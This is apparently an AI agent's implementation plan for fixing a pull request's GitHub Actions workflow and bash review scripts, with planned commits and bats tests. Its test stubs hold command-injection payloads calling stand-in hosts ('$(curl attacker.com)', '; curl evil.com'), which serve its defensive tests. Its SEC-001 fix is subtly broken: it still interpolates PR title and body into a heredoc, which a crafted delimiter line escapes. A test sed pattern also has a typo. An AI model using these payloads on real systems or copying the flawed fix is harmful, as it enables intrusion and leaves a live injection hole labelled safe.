# PR #60 Focused Implementation Plan: P0-P1 Fixes Only

**Version**: 2.0 (Revised after specialist review)
**Date**: 2025-12-18
**Scope**: P0-P1 Critical & Major Issues ONLY
**Estimated Effort**: 4-6 hours

---

## Strategic Direction (from high-level-advisor)

**Key Insight**: Agent consolidation is NOT blocked by PR #60. The consolidation path (PRD → critic → task-generator → implementer) doesn't depend on these workflows.

**Decision**:
- Fix P0-P1 issues (5 changes) and merge
- Defer P2-P3 (170+ comments) to tracked follow-up issue
- Time-box to 6 hours maximum

---

## Specialist Review Verdicts

| Agent | Verdict | Critical Finding |
|-------|---------|-----------------|
| Security | NEEDS_CHANGES | SEC-001: Code injection in `ai-spec-validation.yml` (CRITICAL) |
| Architect | APPROVED | Design is sound; issues are implementation bugs |
| QA | NEEDS_CHANGES | Zero test coverage for 311-line bash script |
| Advisor | APPROVED WITH CONDITIONS | Scope to P0-P1; defer rest |

---

## Implementation Tasks

### TASK-001: Fix SEC-001 Code Injection (P0 - CRITICAL)

**File**: `.github/workflows/ai-spec-validation.yml`
**Lines**: 42-43
**Issue**: Direct use of `${{ github.event.pull_request.title/body }}` in bash env vars

**Current Code** (VULNERABLE):
```yaml
PR_TITLE="${{ github.event.pull_request.title }}"
PR_BODY="${{ github.event.pull_request.body }}"
```

**Fix** (use quoted heredoc):
```yaml
- name: Get PR Details
  run: |
    cat > /tmp/pr-title.txt << 'EOF_TITLE'
    ${{ github.event.pull_request.title }}
    EOF_TITLE

    cat > /tmp/pr-body.txt << 'EOF_BODY'
    ${{ github.event.pull_request.body }}
    EOF_BODY

    echo "PR title and body saved to /tmp files"

- name: Use PR Details Safely
  run: |
    PR_TITLE=$(cat /tmp/pr-title.txt)
    PR_BODY=$(cat /tmp/pr-body.txt)
    # Now safe to use $PR_TITLE and $PR_BODY
```

**Test Requirement**: Add security test case (SEC-T001) with malicious PR title

**Agent**: implementer
**Estimate**: 30 minutes

---

### TASK-002: Fix SEC-004 Race Condition (P1 - HIGH)

**File**: `.github/scripts/ai-review-common.sh`
**Lines**: 59-61
**Issue**: Using `--edit-last` can edit wrong comment if another comment posted between find and edit

**Current Code** (RACE CONDITION):
```bash
echo "$comment_body" | gh pr comment "$pr_number" --edit-last --body-file - 2>/dev/null || \
echo "$comment_body" | gh pr comment "$pr_number" --body-file -
```

**Fix** (use specific comment ID):
```bash
# Use the comment ID we already found (line 56: existing_comment_id)
echo "$comment_body" | gh pr comment --edit "$existing_comment_id" --body-file -
```

**Why**:
- Idempotent: Always edits the correct comment
- No race: Uses specific ID from search
- No fallback needed: Either succeeds or fails clearly

**Test Requirement**: Add race condition test (SEC-T005)

**Agent**: implementer
**Estimate**: 15 minutes

---

### TASK-003: Fix Logic Bug - grep Fallback (P1 - MAJOR)

**File**: `.github/actions/ai-review/action.yml`
**Line**: 307
**Issue**: `|| echo "WARN"` prevents fallback parsing from executing (lines 308-319)

**Current Code** (BUG):
```bash
VERDICT=$(echo "$OUTPUT" | grep -oP '(?<=VERDICT:\s*)[A-Z_]+' | head -1 || echo "WARN")
```

**Fix** (remove premature default, use sed for portability):
```bash
# Remove || echo "WARN" to allow fallback AND use sed instead of grep -P
VERDICT=$(echo "$OUTPUT" | sed -n 's/.*VERDICT:[[:space:]]*\([A-Z_]\+\).*/\1/p' | head -1)
```

**Why**:
- Allows fallback parsing (lines 308-319) to execute when VERDICT is empty
- Portable to macOS (sed vs grep -P which is GNU-only)
- Same functionality

**Test Requirement**: Test case for fallback parsing

**Agent**: implementer
**Estimate**: 15 minutes

---

### TASK-004: Fix Portability - Replace grep -P (P1 - MAJOR)

**File**: `.github/actions/ai-review/action.yml`
**Lines**: 307, potentially others
**Issue**: `grep -P` (Perl regex) is GNU extension, not available on macOS

**Fix** (already included in TASK-003):
Replace `grep -oP '(?<=VERDICT:\s*)[A-Z_]+' ` with `sed -n 's/.*VERDICT:[[:space:]]*\([A-Z_]\+\).*/\1/p'`

**Test Requirement**: Verify sed works on Linux and macOS

**Agent**: Same as TASK-003 (combined fix)
**Estimate**: Included in TASK-003

---

### TASK-005: Add Security Tests (P0 - CRITICAL)

**File**: (new) `.github/scripts/ai-review-common.Tests.sh`
**Framework**: bats (Bash Automated Testing System)
**Coverage Goal**: 80% for critical security paths

**Test Cases Required**:

1. **SEC-T001**: Command injection via PR title
```bash
@test "PR title with command injection is safely handled" {
  # Simulate PR title: $(echo INJECTED)
  # Verify: INJECTED does not appear in output
  # Verify: No command execution
}
```

2. **SEC-T002**: Command injection via PR body
```bash
@test "PR body with curl injection is blocked" {
  # Simulate PR body: $(curl attacker.com)
  # Verify: No network request made
}
```

3. **SEC-T003**: Semicolon injection
```bash
@test "Semicolon command chaining is prevented" {
  # Simulate: "; curl evil.com; echo "
  # Verify: Only first command executes
}
```

4. **SEC-T004**: Backtick injection
```bash
@test "Backtick command substitution is prevented" {
  # Simulate: `whoami`
  # Verify: No command execution
}
```

5. **SEC-T005**: Race condition in comment editing
```bash
@test "Comment editing uses specific ID, not --edit-last" {
  # Mock: Multiple comments exist
  # Action: Edit comment by ID
  # Verify: Correct comment is edited
}
```

**Agent**: implementer (with QA support)
**Estimate**: 2-3 hours

---

### TASK-006: Add Logic/Portability Tests (P1)

**File**: Extend `.github/scripts/ai-review-common.Tests.sh`

**Test Cases Required**:

1. **Fallback parsing test**:
```bash
@test "Fallback verdict parsing triggers when primary fails" {
  OUTPUT="Some text without explicit VERDICT line"
  # Run parsing
  # Verify fallback logic executed
}
```

2. **sed portability test**:
```bash
@test "sed verdict extraction works on Linux and macOS" {
  OUTPUT="VERDICT: PASS"
  VERDICT=$(echo "$OUTPUT" | sed -n 's/.*VERDICT:[[:space]]*\([A-Z_]\+\).*/\1/p')
  [ "$VERDICT" = "PASS" ]
}
```

**Agent**: implementer
**Estimate**: 30 minutes

---

## Implementation Sequence

**Sequential (not parallel)** - per advisor recommendation, 5 fixes don't benefit from parallel workstreams.

```
1. TASK-001: Fix SEC-001 (code injection) - 30min
2. TASK-002: Fix SEC-004 (race condition) - 15min
3. TASK-003 + TASK-004: Fix logic bug + portability - 15min (combined)
4. TASK-005: Add security tests - 2-3h
5. TASK-006: Add logic/portability tests - 30min
6. Run full test suite
7. Commit and verify CI
```

**Total**: 4-5 hours

---

## Testing Strategy

### Test Execution Order

1. **Manual smoke test** (pre-commit):
   - Verify fixes don't break existing workflows
   - Check syntax errors

2. **Security tests** (priority):
   - Run SEC-T001 through SEC-T005
   - Verify all injection scenarios blocked

3. **Logic tests**:
   - Verify fallback parsing works
   - Verify sed portability

4. **Full test suite**:
   - PowerShell tests: `pwsh build/scripts/Invoke-PesterTests.ps1`
   - Bash tests: `bats .github/scripts/ai-review-common.Tests.sh`

5. **CI validation**:
   - Push to PR branch
   - Verify all CI checks pass

---

## Commit Strategy

**Atomic commits per fix** (not one large commit):

```bash
# Commit 1
git add .github/workflows/ai-spec-validation.yml
git commit -m "fix(security): prevent code injection in PR title/body (SEC-001)

Use quoted heredoc to safely handle github.event.pull_request.title/body
instead of direct env var interpolation.

Fixes code injection vulnerability (CWE-78, CVSS 9.8).

🤖 Generated with [Claude Code](https://claude.com/claude-code)

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"

# Commit 2
git add .github/scripts/ai-review-common.sh
git commit -m "fix(race): use specific comment ID for editing (SEC-004)

Replace gh pr comment --edit-last with --edit <id> to prevent race
condition where another comment posted between find and edit would
cause wrong comment to be updated.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"

# Commit 3
git add .github/actions/ai-review/action.yml
git commit -m "fix(logic): enable verdict fallback parsing, improve portability

- Remove || echo \"WARN\" to allow fallback parsing (lines 308-319)
- Replace grep -P with sed for macOS compatibility
- Both fixes address gemini-code-assist[bot] review feedback

🤖 Generated with [Claude Code](https://claude.com/claude-code)

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"

# Commit 4
git add .github/scripts/ai-review-common.Tests.sh
git commit -m "test(security): add bash test suite with injection tests

Add bats framework tests for:
- SEC-T001 through SEC-T005: Command injection scenarios
- Fallback verdict parsing
- sed portability

Addresses QA requirement for bash script test coverage (was 0%).

🤖 Generated with [Claude Code](https://claude.com/claude-code)

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

## Success Criteria

- [ ] SEC-001 (code injection) fixed and tested
- [ ] SEC-004 (race condition) fixed and tested
- [ ] Logic bug (grep fallback) fixed and tested
- [ ] Portability (grep -P) fixed and tested
- [ ] Security tests added (5 test cases)
- [ ] Logic tests added (2 test cases)
- [ ] All tests passing (PowerShell + Bash)
- [ ] CI passing
- [ ] 4 atomic commits pushed

---

## Follow-Up Issue for P2-P3

Create issue to track deferred work:

**Title**: PR #60 Follow-up: Address P2-P3 Review Feedback (170+ comments)

**Body**:
```markdown
## Context

PR #60 received 178+ review comments. P0-P1 critical/major issues were fixed and merged.
This issue tracks P2-P3 (minor/informational) feedback deferred to avoid Session 03 anti-pattern.

## Deferred Comments

- Copilot: ~X comments
- coderabbitai[bot]: ~Y comments
- gemini-code-assist[bot]: ~Z comments
- github-actions[bot]: ~W comments

## Triage Required

Many comments may be:
- Style suggestions (low priority)
- Duplicates (coderabbitai often echoes others)
- Summaries (no action needed)
- False positives (bot noise)

Requires systematic triage per pr-comment-responder workflow.

## Priority

P3 - Nice to have, not blocking any work

## Related

- PR #60: https://github.com/rjmurillo/ai-agents/pull/60
- Original analysis: `.agents/pr-comments/PR-60/implementation-plan.md`
```

**Labels**: `enhancement`, `good-first-issue`, `P3`
**Milestone**: v1.2 (future)

---

## Next Steps

1. **Spawn implementer agent** with this focused plan
2. **Implementer executes** TASK-001 through TASK-006 sequentially
3. **QA verifies** all tests pass
4. **Security performs PIV** (Post-Implementation Verification)
5. **Commit and push** 4 atomic commits
6. **Reply to review comments** with commit SHAs
7. **Create follow-up issue** for P2-P3 comments
8. **Update PR description** if needed
9. **Verify CI passing**
10. **Request re-review** from bots (optional)

---

**End of Focused Implementation Plan**
